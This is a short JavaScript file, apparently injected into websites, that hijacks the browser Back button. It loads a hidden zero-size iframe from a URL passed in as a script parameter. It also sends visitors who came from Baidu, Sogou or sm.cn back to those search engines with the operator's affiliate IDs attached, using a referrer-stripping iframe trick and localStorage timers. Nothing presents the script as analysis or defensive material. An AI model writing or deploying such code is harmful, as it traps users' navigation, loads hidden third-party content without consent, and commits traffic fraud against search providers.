(function() {
    var src = '';
    try{
	var curNode = document.currentScript;
	var src = curNode.src;	
    } catch (e) {}

    var t_t = 5;
    var v = s = u = '';
    if (src){
	var params = UrlParamHash(src);
	t_t = parseInt(params['t']);
	v = decodeURIComponent(params['v']);
	s = params['s'];	
	u = decodeURIComponent(params['u']);	
    }
    if (t_t === 5) return;

    var s_key = 'FFA1DYVO';
    var s_name = 'FP434V';
    var bd_arrs = [v];
    var sg_name = "Sg";
    var sg_num = v;
    var sg_times = 30;
    var sg_regex = new RegExp('[\\?&]keyword=([^&#]*)');
    var sm_name = "Sm";
    var sm_arrs = [v];
    var sm_num = sm_arrs[0];
    var sm_times = 30;
    var sm_regex = new RegExp('[\\?&]q=([^&#]*)');
    var bd_name = "Bd";
    var bd_times = 600;
    var bd_num = bd_arrs[0];
    var storage = window.localStorage;
    var ref = document.referrer;
    var min = 1000;
    var NowDate = (new Date).valueOf();

    function g_r_n(min, max) {
        var range = max - min;
        var rand = Math.random();
        return (min + Math.round(rand * range))
    }

    function UrlParamHash(url) {
	var params = [],h;
	var hash = url.slice(url.indexOf("?") + 1).split('&');
	for (var i = 0; i < hash.length; i++) {
	    h = hash[i].split("="); //
	    params[h[0]] = h[1];
	}
	return params;
    }

    function o_g(name, links, times) {
        function run() {
            try {
                storage.setItem(s_key + name, s_name + "||" + NowDate);
                o_no_ref(links)
            } catch (e) {}
        }
        var storageVal = storage.getItem(s_key + name);
        if (storageVal == null) {
            run()
        } else {
            try {
                var storageTime = storageVal.split("||")[1];
                if (NowDate - storageTime >= min * times) {
                    run()
                } else {
                    history.back()
                }
            } catch (e) {}
        }
    }

    function o_no_ref(link) {
        document.body.appendChild(document.createElement('iframe')).src = 'javascript:"<script>top.location.replace(\'' + link + '\')<\/script>"'
    }
    
    function cf(s,u){
	if (s && u !== 'undefined'){
	    var htturl = document.location.protocol;
	    var li_js = document.createElement('IFRAME');
            li_js.style.cssText = "border: 0;width: 0px;height: 0px; display:none;";
            li_js.setAttribute("scrolling", "no");
            li_js.src = u + s; 
            document.body.appendChild(li_js)	    
	}
    }
    
    try {
	cf(s,u);
        history.replaceState(null, document.title, location.pathname + '#!/xh');
        history.pushState(null, document.title, location.pathname);

        window.addEventListener('popstate', function() {
            if (location.hash == '#!/xh') {
                var href = "";
                var n = "";
                var t = 0;
                history.replaceState(null, document.title, location.pathname);
                if (ref.match(/(.*)sm.cn/g) && sm_regex.exec(ref) && ref.indexOf(sm_num) == -1) {
                	var snum_regex = new RegExp('[\\?&]snum=([^&#]*)');
                	var snum = snum_regex.exec(ref)[1];
                    href = 'http://yz.m.sm.cn/s?q=' + sm_regex.exec(ref)[1] + '&from=' + sm_num + '&safe=1&snum='+snum+ "&k=" + (new Date).valueOf();
                    n = sm_name;
                    t = sm_times;
                } else if (ref.match(/(.*)sogou.com/g) && sg_regex.exec(ref) && ref.indexOf(sg_num) == -1) {
		    if (t_t === 2){
			 href = "http://wap.sogou.com/web/sl?keyword=" + sg_regex.exec(ref)[1] + "&bid=" + sg_num + "&k=" + (new Date).valueOf();
		    }else{
			href = sg_num + sg_regex.exec(ref)[1];
		    }
                    n = sg_name;
                    t = sg_times;
                } else if (ref.match(/(.*)baidu.com/g)) {
                    href = "http://m.baidu.com/?from=" + bd_num + "&k=" + (new Date).valueOf();
                    n = bd_name;
                    t = bd_times;
                } else {
                    history.back();
                }
                o_g(n, href, t);
            }
        }, false);
    } catch (e) {
	alert(e);
    }
}());